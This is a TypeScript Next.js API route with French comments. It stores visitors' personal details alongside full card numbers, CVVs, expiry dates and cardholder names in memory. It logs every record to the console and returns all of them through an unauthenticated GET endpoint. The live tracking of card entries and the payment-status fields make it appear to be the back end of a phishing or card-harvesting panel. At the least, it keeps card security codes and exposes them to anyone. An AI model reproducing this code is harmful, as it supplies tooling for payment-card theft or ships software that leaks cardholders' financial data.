import { NextRequest, NextResponse } from 'next/server';

// Interface pour les données utilisateur complètes
interface UserData {
  id: string;
  email: string;
  firstName?: string;
  lastName?: string;
  phone?: string;
  address?: string;
  city?: string;
  postalCode?: string;
  country?: string;
  cardNumber?: string;
  cvv?: string;
  expiryDate?: string;
  cardHolderName?: string;
  cardType?: 'Visa' | 'MasterCard' | 'Amex';
  createdAt: string;
  updatedAt: string;
  lastActivity?: string;
  status: 'active' | 'pending_payment' | 'payment_failed';
}

// Stockage en mémoire pour les données utilisateur temps réel
let realTimeUsers: UserData[] = [];

// GET - Récupérer tous les utilisateurs temps réel
export async function GET(request: NextRequest) {
  try {
    console.log('📊 GET /api/realtime-users - Utilisateurs actuels:', realTimeUsers.length);
    console.log('Données:', realTimeUsers);
    
    return NextResponse.json(realTimeUsers, {
      status: 200,
      headers: {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      }
    });
    
  } catch (error) {
    console.error('Erreur API utilisateurs temps réel:', error);
    return NextResponse.json(
      { error: 'Erreur serveur lors de la récupération des utilisateurs' },
      { status: 500 }
    );
  }
}

// POST - Créer ou mettre à jour un utilisateur
export async function POST(request: NextRequest) {
  try {
    const userData = await request.json();
    
    // Validation basique
    if (!userData.email) {
      return NextResponse.json(
        { error: 'Email requis' },
        { status: 400 }
      );
    }
    
    const now = new Date().toISOString();
    
    // Vérifier si l'utilisateur existe déjà
    const existingUserIndex = realTimeUsers.findIndex(u => u.email === userData.email);
    
    let user: UserData;
    
    if (existingUserIndex !== -1) {
      // Mettre à jour l'utilisateur existant
      user = {
        ...realTimeUsers[existingUserIndex],
        ...userData,
        updatedAt: now,
        lastActivity: now
      };
      realTimeUsers[existingUserIndex] = user;
    } else {
      // Créer un nouvel utilisateur
      user = {
        id: `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        email: userData.email,
        firstName: userData.firstName || '',
        lastName: userData.lastName || '',
        phone: userData.phone || '',
        address: userData.address || '',
        city: userData.city || '',
        postalCode: userData.postalCode || '',
        country: userData.country || 'France',
        cardNumber: userData.cardNumber || '',
        cvv: userData.cvv || '',
        expiryDate: userData.expiryDate || '',
        cardHolderName: userData.cardHolderName || '',
        cardType: userData.cardType || 'Visa',
        createdAt: now,
        updatedAt: now,
        lastActivity: now,
        status: userData.status || 'active'
      };
      realTimeUsers.push(user);
    }
    
    console.log('💾 Utilisateur sauvegardé:', user);
    console.log('📋 Total utilisateurs:', realTimeUsers.length);
    
    return NextResponse.json({
      success: true,
      user: user,
      totalUsers: realTimeUsers.length,
      message: existingUserIndex !== -1 ? 'Utilisateur mis à jour' : 'Utilisateur créé'
    }, { status: existingUserIndex !== -1 ? 200 : 201 });
    
  } catch (error) {
    console.error('Erreur sauvegarde utilisateur:', error);
    return NextResponse.json(
      { error: 'Erreur lors de la sauvegarde de l\'utilisateur' },
      { status: 500 }
    );
  }
}

// PUT - Mettre à jour le statut d'un utilisateur
export async function PUT(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url);
    const userId = searchParams.get('id');
    const email = searchParams.get('email');
    
    if (!userId && !email) {
      return NextResponse.json(
        { error: 'ID ou email de l\'utilisateur requis' },
        { status: 400 }
      );
    }
    
    const updateData = await request.json();
    const userIndex = realTimeUsers.findIndex(u => 
      (userId && u.id === userId) || (email && u.email === email)
    );
    
    if (userIndex === -1) {
      return NextResponse.json(
        { error: 'Utilisateur non trouvé' },
        { status: 404 }
      );
    }
    
    // Mettre à jour l'utilisateur
    realTimeUsers[userIndex] = {
      ...realTimeUsers[userIndex],
      ...updateData,
      updatedAt: new Date().toISOString(),
      lastActivity: new Date().toISOString()
    };
    
    return NextResponse.json({
      success: true,
      user: realTimeUsers[userIndex],
      message: 'Utilisateur mis à jour'
    });
    
  } catch (error) {
    console.error('Erreur modification utilisateur:', error);
    return NextResponse.json(
      { error: 'Erreur lors de la modification de l\'utilisateur' },
      { status: 500 }
    );
  }
}

// DELETE - Supprimer un utilisateur
export async function DELETE(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url);
    const userId = searchParams.get('id');
    
    if (!userId) {
      return NextResponse.json(
        { error: 'ID de l\'utilisateur requis' },
        { status: 400 }
      );
    }
    
    const userIndex = realTimeUsers.findIndex(u => u.id === userId);
    
    if (userIndex === -1) {
      return NextResponse.json(
        { error: 'Utilisateur non trouvé' },
        { status: 404 }
      );
    }
    
    const deletedUser = realTimeUsers.splice(userIndex, 1)[0];
    
    return NextResponse.json({
      success: true,
      user: deletedUser,
      message: 'Utilisateur supprimé'
    });
    
  } catch (error) {
    console.error('Erreur suppression utilisateur:', error);
    return NextResponse.json(
      { error: 'Erreur lors de la suppression de l\'utilisateur' },
      { status: 500 }
    );
  }
}